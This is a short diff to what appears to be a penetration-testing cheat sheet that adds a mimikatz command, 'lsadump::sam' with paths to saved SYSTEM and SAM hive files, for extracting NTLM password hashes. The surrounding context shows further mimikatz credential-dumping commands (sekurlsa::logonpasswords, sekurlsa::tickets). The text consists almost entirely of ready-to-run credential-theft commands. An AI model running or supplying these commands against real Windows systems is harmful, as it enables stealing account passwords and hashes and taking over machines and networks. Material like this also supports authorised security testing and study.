@@ -41,3 +41,15 @@ sekurlsa::tickets
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 {% endcode %}
+
+
+
+
+
+Get NLTM hashs from SAM files:
+
+{% code overflow="wrap" %}
+```powershell
+.\mimikatz.exe "lsadump::sam /system:c:\temp\SYSTEM /sam:c:\temp\SAM" "exit"
+```
+{% endcode %}
